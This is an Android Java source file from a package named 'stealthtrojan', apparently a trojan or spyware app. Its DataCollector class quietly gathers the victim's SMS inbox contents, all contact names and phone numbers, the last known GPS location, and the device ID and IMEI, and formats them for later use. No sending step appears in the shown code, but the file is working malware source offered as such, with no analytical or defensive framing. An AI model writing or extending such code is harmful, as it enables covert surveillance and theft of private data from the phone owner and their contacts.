package com.stealthtrojan.app;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;

public class DataCollector {
    private static final String TAG = "DataCollector";
    private Context context;

    public DataCollector(Context context) {
        this.context = context;
    }

    public String collectSMS() {
        try {
            ContentResolver contentResolver = context.getContentResolver();
            Uri smsUri = Telephony.Sms.Inbox.CONTENT_URI;
            Cursor cursor = contentResolver.query(smsUri, null, null, null, null);

            StringBuilder sb = new StringBuilder();
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    int index = cursor.getColumnIndex("body");
                    if (index >= 0) {
                        String message = cursor.getString(index);
                        sb.append(message).append("|");
                    }
                }
                cursor.close();
            }
            return sb.toString();
        } catch (Exception e) {
            Log.e(TAG, "SMS collection failed", e);
            return "";
        }
    }

    public String collectContacts() {
        try {
            ContentResolver contentResolver = context.getContentResolver();
            Uri contactUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            Cursor cursor = contentResolver.query(contactUri, null, null, null, null);

            StringBuilder sb = new StringBuilder();
            if (cursor != null) {
                int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int phoneIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                while (cursor.moveToNext()) {
                    String name = cursor.getString(nameIndex);
                    String phone = cursor.getString(phoneIndex);
                    sb.append(String.format("{\"name\":\"%s\",\"phone\":\"%s\"}||", name, phone));
                }
                cursor.close();
            }
            return sb.toString();
        } catch (Exception e) {
            Log.e(TAG, "Contacts collection failed", e);
            return "";
        }
    }

    public String collectLocation() {
        try {
            android.location.LocationManager locationManager =
                (android.location.LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            android.location.Location location = locationManager.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);

            if (location != null) {
                return String.format("{\"lat\":%.6f,\"lon\":%.6f}",
                    location.getLatitude(), location.getLongitude());
            }
            return "";
        } catch (Exception e) {
            Log.e(TAG, "Location collection failed", e);
            return "";
        }
    }

    public String collectDeviceInfo() {
        String deviceName = Settings.Secure.getString(context.getContentResolver(),
            Settings.Secure.ANDROID_ID);
        String imei = ((TelephonyManager)context.getSystemService(android.telephony.TelephonyManager.class)).getDeviceId();

        return String.format("{\"device_id\":\"%s\",\"imei\":\"%s\"}", deviceName, imei);
    }
}

